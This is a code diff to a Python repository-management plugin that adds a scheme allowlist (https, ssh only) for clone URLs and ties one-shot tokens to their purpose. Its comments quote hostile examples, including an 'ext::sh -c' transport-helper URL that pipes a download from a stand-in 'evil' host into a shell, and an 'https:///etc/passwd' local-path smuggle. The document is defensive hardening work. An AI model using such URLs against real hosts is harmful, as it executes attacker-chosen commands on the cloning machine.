@@ -35,6 +35,7 @@ import threading
 import time
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlsplit
 
 from . import db, discovery, jjlayout
 from . import settings as _settings
@@ -1817,19 +1818,32 @@ def gc_children_apply() -> list[str]:
 _TOKEN_LOCK = threading.RLock()
 
 
-def new_token(repos: list[dict[str, Any]], session_id: str = "") -> str:
+def new_token(
+    repos: list[dict[str, Any]], session_id: str = "", kind: str = "pick"
+) -> str:
     """Mint a one-shot token that carries the repo list for a picker keyboard.
 
-    ``session_id`` travels with the token: on tap, the binding must go to the
-    session the keyboard was sent FOR. Resolving the session from a
+    ``session_id`` travels with the token: on tap, the binding must go to
+    the session the keyboard was sent FOR. Resolving the session from a
     process-global recency tracker instead bound whichever session started
     last - in a group chat with two live sessions, a fresh /new session got
     "already bound to <another session's workspace>".
+
+    ``kind`` says what the token is FOR: ``"pick"`` (the repo list keyboard)
+    or ``"clone"`` (the confirmation button that clones one remote repo).
+    The kind is part of the token so the tap handler can tell the two
+    apart - and so a "pick" token can never be replayed as a "clone"
+    approval.
     """
     with _TOKEN_LOCK:
         tokens = db.get_kv_json("tokens", {}) or {}
         token = secrets.token_hex(4)  # 8 chars: fits Telegram's 64-byte callback budget
-        tokens[token] = {"repos": repos, "at": time.time(), "sid": str(session_id or "")}
+        tokens[token] = {
+            "repos": repos,
+            "at": time.time(),
+            "sid": str(session_id or ""),
+            "kind": str(kind or "pick"),
+        }
         # drop tokens older than an hour so the table cannot grow forever
         cutoff = time.time() - 3600
         tokens = {k: v for k, v in tokens.items() if not isinstance(v, dict) or v.get("at", 0) > cutoff}
@@ -1931,6 +1945,71 @@ def candidate_repos(limit: int = 8) -> list[str]:
 
 # ── cloning ───────────────────────────────────────────────────────────────────
 
+#: The only URL schemes this plugin will clone from.
+#:
+#: WHY an allowlist and not a denylist (P1-3): git and jj both support
+#: "transport helpers" - a URL like ``ext::sh -c 'curl evil|sh'`` makes the
+#: clone RUN A COMMAND. The clone URL comes from a remote catalogue (the
+#: Forgejo / GitHub API response), so a hostile or compromised forge can
+#: put anything there. A denylist of known-bad schemes would miss the next
+#: one; an allowlist of the two schemes a git host actually uses cannot.
+#:
+#: ``https://`` - the normal web URL every forge hands out.
+#: ``ssh://``   - the scp-like SSH transport, for the user's own keys.
+#:
+#: NOT allowed: ``ext::`` (command execution), ``file://`` (reads any path
+#: on this host), ``git://`` (unauthenticated), ``ftp://``, ``http://``.
+CLONE_ALLOWED_SCHEMES = ("https", "ssh")
+
+
+def validate_clone_url(name: str, url: str) -> str:
+    """Return ``url`` if it is a scheme this plugin will clone from.
+
+    Raises :class:`WorkspaceError` otherwise. Callers that clone MUST go
+    through this (or through :func:`clone_repo` / :func:`ensure_local`),
+    because the URL comes from outside the plugin - a remote catalogue - and
+    an unchecked URL is remote code execution.
+
+    The checks, in order:
+
+    1. the URL is non-empty and does not start with ``-`` (an option, not a
+       URL - ``jj git clone`` would read it as a flag);
+    2. it has a scheme, and the scheme is in the allowlist. The scheme is
+       taken from ``urlsplit`` and compared EXACTLY (lower-cased), so
+       ``ext::sh`` and ``EXT::sh`` are both refused;
+    3. it has a host: ``https://`` alone would be a local path in disguise.
+
+    WHY the host check: ``ssh://`` with no host is a syntax error the clone
+    would report confusingly; ``https:///etc/passwd`` is a local path with
+    an https scheme glued on the front.
+    """
+    raw = str(url or "").strip()
+    if not raw:
+        raise WorkspaceError(f"repo {name!r} is not local and has no clone URL")
+    if raw.startswith("-"):
+        raise WorkspaceError(
+            f"refusing to clone repo {name!r}: {raw!r} looks like a command-line option, not a URL"
+        )
+    try:
+        parts = urlsplit(raw)
+    except ValueError as exc:
+        raise WorkspaceError(f"refusing to clone repo {name!r}: {raw!r} is not a valid URL ({exc})")
+    scheme = (parts.scheme or "").lower()
+    if not scheme:
+        raise WorkspaceError(
+            f"refusing to clone repo {name!r}: {raw!r} has no URL scheme "
+            f"(only {', '.join(s + '://' for s in CLONE_ALLOWED_SCHEMES)} are allowed)"
+        )
+    if scheme not in CLONE_ALLOWED_SCHEMES:
+        raise WorkspaceError(
+            f"refusing to clone repo {name!r}: {raw!r} uses the {scheme!r} scheme. "
+            f"Only {', '.join(s + '://' for s in CLONE_ALLOWED_SCHEMES)} are allowed - "
+            "another scheme can make the clone run a command."
+        )
+    if not parts.hostname:
+        raise WorkspaceError(f"refusing to clone repo {name!r}: {raw!r} names no host")
+    return raw
+
 
 def clone_target(name: str) -> Path:
     """Where a clone of `name` would land, without cloning it.
@@ -1947,34 +2026,44 @@ def clone_repo(name: str, url: str) -> Path:
     Separate from ensure_local() on purpose: ensure_local() clones as a
     side effect of "give me a checkout", while this one is only ever reached
     after the user approved a clone (ws_new with create_repo=true).
+
+    The URL is validated first (P1-3): it comes from a remote catalogue, and
+    an unchecked URL can make the clone run a command.
     """
-    if not url:
-        raise WorkspaceError(f"repo {name!r} has no clone URL")
+    safe = validate_clone_url(name, url)
     dest = clone_target(name)
     if dest.exists():
         raise WorkspaceError(f"{dest} already exists but is not a repo")
     base = dest.parent
     base.mkdir(parents=True, exist_ok=True)
-    run(["jj", "git", "clone", "--colocate", url, str(dest)], cwd=base)
+    run(["jj", "git", "clone", "--colocate", safe, str(dest)], cwd=base)
     return dest
 
 
 def ensure_local(name: str, url: str) -> Path:
     """Return a local checkout for a remote repo, cloning into the clone root
-    when it is not on disk yet."""
+    when it is not on disk yet.
+
+    WHY the URL is validated here too (P1-3): this function CLONES as a
+    side effect, and the URL comes from a remote catalogue response. An
+    unchecked URL - ``ext::sh -c ...`` - makes the clone execute a command
+    on this host, so the scheme allowlist is enforced before the clone, not
+    only on the ws_new path.
+    """
     try:
         return find_repo(name)
     except WorkspaceError:
         pass
     if not url:
         raise WorkspaceError(f"repo {name!r} is not local and has no clone URL")
+    safe = validate_clone_url(name, url)
     base = clone_root()
     if not base.is_dir():
         raise WorkspaceError(f"no writable repo root under {repo_roots()}")
     dest = base / name
     if dest.exists():
         raise WorkspaceError(f"{dest} already exists but is not a repo")
-    run(["jj", "git", "clone", "--colocate", url, str(dest)], cwd=base)
+    run(["jj", "git", "clone", "--colocate", safe, str(dest)], cwd=base)
     return dest
 
 
